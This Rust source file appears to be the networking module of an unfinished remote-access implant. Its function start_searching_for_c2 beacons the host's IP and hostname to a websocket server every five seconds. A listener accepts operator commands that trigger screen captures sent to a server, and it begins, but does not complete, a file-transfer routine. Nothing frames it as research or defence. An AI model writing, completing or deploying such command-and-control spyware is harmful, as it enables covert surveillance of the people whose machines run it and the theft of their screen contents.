mod file_reciever;
mod screenshot_sender;

use std::thread::sleep;
use std::time::Duration;
use std::{net::TcpListener, thread::spawn};
use tungstenite::handshake::client::Response;
use tungstenite::{connect, Message};

use crate::SERVER;
use gethostname::gethostname;
use local_ip_address::local_ip;

pub struct Connector<'a> {
    //Server address sends data to main server
    socket_addr_server: &'a str,
}
impl<'a> Connector<'a> {
    pub fn new(address_server: &'a str) -> Self {
        Connector {
            socket_addr_server: address_server,
        }
    }
    fn debug(response: Response) {
        println!("Connected to the server");
        println!("Response HTTP code: {}", response.status());
        println!("Response contains the following headers:");
        for (header, _value) in response.headers() {
            println!("* {header}");
        }
    }
    pub fn send_data(&self, data: &str) {
        let (mut socket, response) = connect(self.socket_addr_server).expect("Can't connect");
        //debug;
        // Self::debug(response);
        socket.send(Message::Text(data.into())).unwrap();
        let _ = socket.close(None);
    }
    pub fn start_searching_for_c2(&self) {
        let my_local_ip = local_ip().unwrap();
        let hostname = gethostname();
        //Im really not feeling like dealing with rust shenanigans rn
        //Rewrtie later this piece of crap
        let socket_addr_server = self.socket_addr_server.to_string();
        loop {
            println!("{}", &format!("ping|{:?}|{:?}", my_local_ip, hostname));
            let mut internal_connector = Connector::new("ws://localhost:4000/socket");
            internal_connector.send_data(&format!("ping|{:?}|{:?}", my_local_ip, hostname));
            //ping every 5 seconds
            //Reimplement later
            sleep(Duration::from_secs(5));
        }
    }
    pub fn subscribe_for_updates(&self) {
        let server = TcpListener::bind(SERVER).unwrap();
        for stream in server.incoming() {
            let socket_addr_server = self.socket_addr_server.to_string();
            spawn(move || {
                use tungstenite::accept;

                let mut websocket = accept(stream.unwrap()).unwrap();
                let mut writing = false;
                let mut buffer: Vec<u8> = Vec::new();
                loop {
                    let msg = websocket.read().unwrap();
                    if writing {
                        //file_reciever::recieve_file(msg.clone(), &mut buffer);
                    }
                    match msg.to_string().as_str() {
                        "file_transfer_start" => writing = true,
                        "picture_request" => {
                            screenshot_sender::make_screenshot(&socket_addr_server)
                        }
                        _ => println!("{}", msg),
                    }
                }
            });
        }
    }
}
